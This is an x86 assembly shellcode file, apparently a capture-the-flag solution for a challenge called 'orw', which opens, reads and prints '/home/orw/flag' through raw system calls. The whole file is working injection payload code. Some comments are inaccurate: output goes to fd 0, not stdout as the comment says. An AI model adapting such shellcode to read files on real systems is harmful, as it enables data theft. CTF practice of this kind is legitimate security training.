section .text
global _start

_start:

	; push '/home/orw/flag' onto stack.
	push 0x00006761				; ag\x00\x00
	push 0x6c662f77				; w/fl
	push 0x726f2f65				; e/or
	push 0x6d6f682f				; /hom

        ; 5 sys_open('filepath', 0)
        mov ecx, 0                  ; 0 read-only | 1 write-only | 2 read-write
        mov ebx, esp	            ; memory address of file name
        mov eax, 5
        int 0x80

        ; 3 sys_read(3, [address], size)
        mov edx, 200                ; size to read
        mov ecx, esp                ; memory address of file contents.
        mov ebx, eax                ; open() returns new fd #3 & loads into EAX.
        int 0x80

        ; 4 sys_write(1, [address], size)
        mov edx, 200                ; size to read
        mov ecx, esp               	; file contents
        mov ebx, 0                  ; print to stdout
        mov eax, 4
        int 0x80
